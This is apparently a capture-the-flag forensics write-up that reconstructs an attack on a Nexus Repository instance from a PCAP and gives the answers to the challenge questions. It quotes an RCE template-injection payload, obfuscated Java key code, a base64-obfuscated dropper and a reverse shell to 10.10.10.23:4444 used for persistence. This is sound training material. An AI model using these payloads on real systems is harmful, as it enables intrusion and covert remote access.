![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>The Nexus Breach</font>

4<sup>th</sup> February 2025

Prepared By: Nauten

Challenge Author(s): Nauten

Difficulty: <font color='orange'>Medium</font>

<br><br>

# Synopsis

- The Nexus Breach is a medium level forensics challenge that requires analyzing a PCAP file containing network traffic related to an attack that targets a Nexus OSS instance.

  The goal is to dissect the traffic, identify activities and piece together the sequence of events by answering a series of questions in order to get the flag.

## Description

- In an era fraught with cyber threats, Talion "Byte Doctor" Reyes, a former digital forensics examiner for an international crime lab, has uncovered evidence of a breach targeting critical systems vital to national infrastructure. Subtle traces of malicious activity point to a covert operation orchestrated by the Empire of Volnaya, a nation notorious for its expertise in cyber sabotage and hybrid warfare tactics.
  
  The breach threatens to disrupt essential services that Task Force Phoenix relies on in its ongoing fight against the expansion of the Empire of Volnaya. The attackers have exploited vulnerabilities in interconnected systems, employing sophisticated techniques to evade detection and trigger widespread disruption
  
  Can you analyze the digital remnants left behind, reconstruct the attack timeline, and uncover the full extent of the threat?

## Skills Required

- Familiarity with analyzing network traffic
- Analyzing and understanding logic behind Java/Bash obfuscated code
- Analyzing and detecting custom attacks

## Skills Learned

- Reversing and analyzing obfuscated Java/Bash code
- Analyzing events and reconstructing the context attack
- Analyzing and detecting custom persistence techniques

# Enumeration

The following file is provided:

- `capture.pcap`

The file contains network traffic, more specifically:

- HTTP traffic on port 8081 (default Nexus OSS port)
- TCP encrypted traffic (port 4444)

To list all HTTP endpoints called it's possible to execute this command:

```bash
$ tshark -2 -r capture.pcap -Y "http.request" -T fields -e http.request.uri | sort -u
/nexus/service/local/authentication/login
/nexus/service/local/repositories/releases/content/com/artsploit/nexus-rce/maven-metadata.xml
/nexus/service/local/repositories/releases/content//.nexus/attributes/com/artsploit/nexus-rce/maven-metadata.xml
/nexus/service/local/repositories/snapshots/content/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar
/nexus/service/local/status
/nexus/service/local/users
```

# Solution

### [1/10] Which credentials has been used to login on the platform? (e.g. username:password)

Apply the Wireshark filter `http.response.code eq 200 && http.request.uri contains "/login"` and inspect the HTTP request: 

```http
GET /nexus/service/local/authentication/login HTTP/1.1
Host: phoenix.htb:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept-Encoding: gzip, deflate
Accept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json
Connection: keep-alive
X-Nexus-UI: true
X-Requested-With: XMLHttpRequest
Authorization: Basic YWRtaW46ZEw0enlWSjF5OFVoVDFoWDFt
```

Decode the `Authorization` header using BASE64 to reveal the credentials.

* Answer: `admin:dL4zyVJ1y8UhT1hX1m`

### [2/10] Which Nexus OSS version is in use? (e.g. 1.10.0-01)

Apply the Wireshark filter `http.request.uri contains "/status"`.

This endpoint is called via a `GET` request.

The response contains an object with instance information, including the version:

```json
{"data":{"appName":"Nexus Repository Manager","formattedAppName":"Nexus Repository Manager OSS 2.15.1-02","version":"2.15.1-02","apiVersion":"2.15.1-02","editionLong":"","editionShort":"OSS","attributionsURL":"http://links.sonatype.com/products/nexus/oss/attributions","purchaseURL":"http://links.sonatype.com/products/nexus/oss/store","userLicenseURL":"http://links.sonatype.com/products/nexus/oss/EULA","state":"STARTED","initializedAt":"2025-03-24 10:03:15.565 UTC","startedAt":"2025-03-24 10:03:16.359 UTC","lastConfigChange":"2025-03-24 10:03:16.359 UTC","firstStart":false,"instanceUpgraded":false,"configurationUpgraded":false,"baseUrl":"http://phoenix.htb:8081/nexus","licenseInstalled":false,"licenseExpired":false,"trialLicense":false}}
```

The same information can be retrieved from HTTP response header "Server": 

`Nexus/2.15.1-02 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8`

* Answer: ` 2.15.1-02`

### [3/10] The attacker created a new user for persistence. Which credentials has been set? (e.g. username:password)

Apply the Wireshark filter `http.request.uri contains "/users"`.

This endpoint is called via a `POST` request.

The request contains an object with user information:

```http
POST /nexus/service/local/users HTTP/1.1
Host: phoenix.htb:8081
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: application/json
Connection: keep-alive
Content-Type: application/json; charset=UTF-8
Authorization: Basic YWRtaW46ZEw0enlWSjF5OFVoVDFoWDFt
Cookie: NXSESSIONID=8e38dcb7-7f98-4c5d-bba0-cd74abbc6f76
Content-Length: 192

{"data": {"userId": "adm1n1str4t0r", "firstName": "Persistent", "lastName": "Admin", "email": "adm1n1str4t0r@phoenix.htb", "status": "active", "roles": ["nx-admin"], "password": "46vaGuj566"}}
```

* Answer: `adm1n1str4t0r:46vaGuj566`

### [4/10] One core library written in Java has been tampered and replaced by a malicious one. Which is its package name? (e.g. com.company.name)

Export the file `PhoenixCyberToolkit-1.0.jar` from HTTP stream (using Wireshark) and decompile it using JD-GUI.

Looking at the structure, package name is shown:

![](assets/1.png)

* Answer: `com.phoenix.toolkit`

### [5/10] The tampered library contains encrypted communication logic. What is the secret key used for session encryption? (e.g. Secret123)

Analysis of the decompiled code reveals obfuscated AES encryption. 

The key undergoes a custom transformation before use, so the used value for encryption is not directly in plain text.

To obtain the effectively used value it's possible to use this code (obtained after stripping and modifying the original source code):

```java
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class App {
    private static final String pKzLq7 = Base64.getEncoder().encodeToString(xYzWq8("3t9834".getBytes(), 55));
    private static final String wYrNb2 = Base64.getEncoder().encodeToString(xYzWq8("s3cr".getBytes(), 77));
    private static final String xVmRq1 = Base64.getEncoder().encodeToString(xYzWq8("354r".getBytes(), 23));
    private static final String aDsZx9 = Base64.getEncoder().encodeToString(xYzWq8("34".getBytes(), 42));

    private static final int[] nQoMf6 = {3, 2, 1, 0};

    public static void main(String[] args) {
        try {
            String jAbTs3 = mNoPq5();
            System.out.println("Generated Key: " + jAbTs3);
        } catch (Exception zXlMp2) {
            zXlMp2.printStackTrace();
        }
    }

    private static String mNoPq5() throws Exception {
        String[] cWlNz5 = {
            fGhJk6(pKzLq7, 55),
            fGhJk6(wYrNb2, 77),
            fGhJk6(xVmRq1, 23),
            fGhJk6(aDsZx9, 42)
        };

        StringBuilder qTxMv7 = new StringBuilder();
        for (int dZrWp4 : nQoMf6) {
            qTxMv7.append(cWlNz5[dZrWp4]);
        }
        return gDF5a(qTxMv7.toString());
    }

    private static String fGhJk6(String gZrMx9, int tPyWl3) {
        byte[] jKtXp5 = Base64.getDecoder().decode(gZrMx9);
        byte[] yNrQz4 = xYzWq8(jKtXp5, tPyWl3);
        return new String(yNrQz4, StandardCharsets.UTF_8);
    }

    private static byte[] xYzWq8(byte[] mBxNz8, int qVyWp1) {
        byte[] rTzXk6 = new byte[mBxNz8.length];
        for (int vJlNy3 = 0; vJlNy3 < mBxNz8.length; vJlNy3++) {
            rTzXk6[vJlNy3] = (byte) (mBxNz8[vJlNy3] ^ qVyWp1);
        }
        return rTzXk6;
    }

    private static String gDF5a(String bHJ2k) {
        StringBuilder fPL7m = new StringBuilder();
        int zQW3x = 7;
        for (char c : bHJ2k.toCharArray()) {
            int yTR8v = ((c ^ zQW3x) + 33) % 94 + 33;
            fPL7m.append((char) yTR8v);
        }
        return fPL7m.toString();
    }
}
```

* Answer: `vuvtuYXvHYvW"#vu`

### [6/10] Which is the name of the function that manages the (AES) string decryption process? (e.g. aVf41)

```java
private static String uJtXq5(String kVzNy4, String pWlXq7) throws Exception {
    SecretKeySpec bFyMp6 = new SecretKeySpec(pWlXq7.getBytes(StandardCharsets.UTF_8), "AES");
    Cipher tZrXq9 = Cipher.getInstance("AES");
    tZrXq9.init(Cipher.DECRYPT_MODE, bFyMp6);
    return new String(tZrXq9.doFinal(Base64.getDecoder().decode(kVzNy4)));
}
```

The `DECRYPT_MODE` flag indicates the function responsible for AES decryption.

Answer: `uJtXq5`

### [7/10] Which is the system command that triggered the reverse shell execution for this session running the tampered JAR? (e.g. "java .... &")

Apply the Wireshark filter `http.request.uri contains "xml"` and inspect the HTTP request: 

```http
PUT /nexus/service/local/repositories/releases/content/com/artsploit/nexus-rce/maven-metadata.xml HTTP/1.1
Host: phoenix.htb:8081
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: text/xml
Authorization: Basic YWRtaW46ZEw0enlWSjF5OFVoVDFoWDFt
Cookie: NXSESSIONID=8e38dcb7-7f98-4c5d-bba0-cd74abbc6f76
Content-Length: 563

#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("java -jar /sonatype-work/storage/snapshots/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar &"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
$output
```

This payload can be reconducted to **CVE-2024-5082** (RCE vulnerability) and the command used to run the tampered JAR that triggers the reverse shell is visible as parameter of **exec** function.

Answer: `java -jar /sonatype-work/storage/snapshots/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar &`

### [8/10] Which is the first executed command in the encrypted reverse shell session? (e.g. whoami)

Getting the answer for this question requires decryption of the encrypted session traffic related to port 4444 using previous found informations.
Script to decode input and outputs of system executed commands:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

key = b'vuvtuYXvHYvW"#vu'
input_file = 'encrypted.txt'

def decrypt_line_ecb(line):
    line = line.strip()
    if not line:
        return None

    try:
        encrypted_data = base64.b64decode(line)
    except Exception as e:
        print(f"Base64 error: {e}")
        return None

    try:
        cipher = AES.new(key, AES.MODE_ECB)
        decrypted = cipher.decrypt(encrypted_data)
        # Unpad if necessary
        try:
            decrypted = unpad(decrypted, AES.block_size)
        except:
            pass

        return decrypted.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"Decryption error: {e}")
        return None

def main():
    print("Decrypting lines using AES/ECB...\n")
    with open(input_file, 'r') as f:
        for idx, line in enumerate(f.readlines(), 1):
            line = line.strip()
            if line:
              print(f"Line {idx}:")
              result = decrypt_line_ecb(line)
              if result:
                  print(f"Decrypted:\n{result}\n")
              else:
                  print("Could not decrypt.\n")

if __name__ == "__main__":
    main()
```

The `encrypted.txt` file should contain all base64 strings extracted from the network capture of the entire stream that can be obtained using filter `tcp.stream eq 1` on Wireshark and following it.

Taking first decoded result of the string gives the answer.

* Answer: `uname -a`

### [9/10] Which other legit user has admin permissions on the Nexus instance (excluding "adm1n1str4t0r" and "admin")? (e.g. john_doe)
Decode the output of the command `cat /sonatype-work/conf/security.xml`, this file contains informations about all existing users and roles on the instance. 

Identify the admin user from this file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<security>
  <version>2.0.5</version>
  <users>
    <user>
      <id>deployment</id>
      <firstName>Deployment</firstName>
      <lastName>User</lastName>
      <password>b2a0e378437817cebdf753d7dff3dd75483af9e0</password>
      <status>active</status>
      <email>deployment@corp.htb</email>
    </user>
    <user>
      <id>anonymous</id>
      <firstName>Nexus</firstName>
      <lastName>Anonymous User</lastName>
      <password>$shiro1$SHA-512$1024$zVANUnbAR2sp7I00pquLIQ==$5u2+o6DUtQ46YOOnk3PVCEobyqNaq2It6Rpf/jq0Se3EtObgr+mTUOOfEPBzyfSeLJgQCdkCbWnJvE1sNLbQ0A==</password>
      <status>active</status>
      <email>anonymous@corp.htb</email>
    </user>
    <user>
      <id>john_smith</id>
      <firstName>john</firstName>
      <lastName>smith</lastName>
      <password>$shiro1$SHA-512$1024$rWbh6j+8PZjTJwmq5L1RbA==$NoNDVWu1XN90QAnLGaOQ7nMVa0kOH28mnRb+U4cKwaJzox1isD+zSsKR5oSgEtqJzHpO/ZNDLEdOTnNCrdwsSw==</password>
      <status>active</status>
      <email>john_smith@corp.htb</email>
    </user>
    <user>
      <id>brad_smith</id>
      <firstName>Brad</firstName>
      <lastName>Smith</lastName>
      <password>$shiro1$SHA-512$1024$KxTwUY7hJfejxH4Lu9IyJQ==$gyBhme+Ymn1aL4AWu3bT4invCu5KoI3m3OMbYKErJ4jMvjTM9ELxxn0Zd5Y7rFLxE2HlcCVY6ahRqVkm9yfgXA==</password>
      <status>active</status>
      <email>brad_smith@corp.htb</email>
    </user>
    <user>
      <id>admin</id>
      <firstName>Administrator</firstName>
      <lastName>User</lastName>
      <password>$shiro1$SHA-512$1024$qYmC+VGcNXGxoLo3jHZpQg==$PFPFYc9hoYxLzV4EZFIELz7dGiTSLUYGCpzBatrh91sM/PIU01CPwWGDDA7OumGKfsgNXr7p25hALKIlyZqmzg==</password>
      <status>active</status>
      <email>administrator@corp.htb</email>
    </user>
    <user>
      <id>adm1n1str4t0r</id>
      <firstName>Persistent</firstName>
      <lastName>Admin</lastName>
      <password>$shiro1$SHA-512$1024$0l24cxJgYeT+cx22Vcl14A==$KLQ1VE9OcjxoGjzH+uUmYUAFMHmTd9eIdgZE5T5Ten4MnNVYA8rn8wZptdNDmT0BHcK18N2ERz8/3kpaL0r7Lg==</password>
      <status>active</status>
      <email>adm1n1str4t0r@phoenix.htb</email>
    </user>
  </users>
  <userRoleMappings>
    <userRoleMapping>
      <userId>deployment</userId>
      <source>default</source>
      <roles>
        <role>repository-any-full</role>
        <role>nx-deployment</role>
      </roles>
    </userRoleMapping>
    <userRoleMapping>
      <userId>anonymous</userId>
      <source>default</source>
      <roles>
        <role>repository-any-read</role>
        <role>anonymous</role>
      </roles>
    </userRoleMapping>
    <userRoleMapping>
      <userId>john_smith</userId>
      <source>default</source>
      <roles>
        <role>nx-admin</role>
      </roles>
    </userRoleMapping>
    <userRoleMapping>
      <userId>brad_smith</userId>
      <source>default</source>
      <roles>
        <role>nx-developer</role>
      </roles>
    </userRoleMapping>
    <userRoleMapping>
      <userId>admin</userId>
      <source>default</source>
      <roles>
        <role>nx-admin</role>
      </roles>
    </userRoleMapping>
    <userRoleMapping>
      <userId>adm1n1str4t0r</userId>
      <source>default</source>
      <roles>
        <role>nx-admin</role>
      </roles>
    </userRoleMapping>
  </userRoleMappings>
</security>
```

* Answer: `john_smith`

### [10/10] The attacker wrote something in a specific file to maintain persistence, which is the full path? (e.g. /path/file)

Using the decoding script and taking the last executed command in the session gives:

```bash
echo "Z0g0PSJFZCI7a00wPSJ4U3oiO2M9ImNoIjtMPSI0IjtyUVc9IiI7ZkUxPSJsUSI7cz0iICc9b2djbFJYWWtCWGR0Z1hhdVYyYm9Cbkx2VTJaaEozYjBOM0xySjNiMzFTWndsSGRoNTJiejlDSTR0Q0lrOVdib05HSW1ZQ0l5VkdkaFJHYzExQ2VwNVdadmhHY3U4U1puRm1jdlIzY3ZzbWN2ZFhMbEJYZTBGbWJ2TjNMZzRESWlFakorQURJMFFETjA4eU15NENNeDRDTXg0Q014OENjalIzTDJWR1p2QWlKK0FTYXRBQ2F6Rm1ZaUF5Ym9OV1oKJyB8IHIiO0h4Sj0icyI7SGMyPSIiO2Y9ImFzIjtrY0U9InBhcyI7Y0VmPSJhZSI7ZD0ibyI7Vjl6PSI2IjtQOGM9ImlmIjtVPSIgLWQiO0pjPSJlZiI7TjBxPSIiO3Y9ImIiO3c9ImUiO2I9InYgfCI7VHg9IkVkcyI7eFpwPSIiCng9JChldmFsICIkSGMyJHckYyRyUVckZCRzJHckYiRIYzIkdiR4WnAkZiR3JFY5eiRyUVckTCRVJHhacCIpCmV2YWwgIiROMHEkeCRIYzIkclFXIgo=" | base64 --decode | sh
```

Applying a base64 decoding operation returns:

```bash
gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=ogclRXYkBXdtgXauV2boBnLvU2ZhJ3b0N3LrJ3b31SZwlHdh52bz9CI4tCIk9WboNGImYCIyVGdhRGc11Cep5WZvhGcu8SZnFmcvR3cvsmcvdXLlBXe0FmbvN3Lg4DIiEjJ+ADI0QDN08yMy4CMx4CMx4CMx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
```

Modifying "eval" to "echo" and executing it returns:

```bash
echo "bash -i >& /dev/tcp/10.10.10.23/4444 0>&1" > /sonatype-work/storage/.phoenix-updater && chmod +x /sonatype-work/storage/.phoenix-updater
```

* Answer: `/sonatype-work/storage/.phoenix-updater`

